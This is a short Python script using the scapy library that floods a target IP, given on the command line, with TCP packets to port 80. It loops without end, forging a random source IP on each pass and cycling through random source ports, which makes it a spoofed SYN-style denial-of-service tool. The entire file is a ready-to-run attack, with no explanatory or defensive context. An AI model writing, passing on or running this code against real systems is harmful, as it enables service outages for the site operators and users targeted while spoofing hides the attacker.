import random
import sys
from scapy import sendrecv
from scapy.layers import inet


def dos(target_ip):
    count = 0
    port_list = [i for i in range(1, 65535)]
    while True:
        count += 1
        a = str(random.randint(1, 254))
        b = str(random.randint(1, 254))
        c = str(random.randint(1, 254))
        d = str(random.randint(1, 254))
        dot = '.'

        source_ip = a + dot + b + dot + c + dot + d

        for source_port in random.sample(port_list, 100):
            IP1 = inet.IP(src=source_ip, dst=target_ip)
            TCP1 = inet.TCP(sport=source_port, dport=80)
            pkt = IP1 / TCP1
            sendrecv.send(pkt, inter=0.001)



if __name__ == '__main__':
    target = sys.argv[1]
    dos(target)
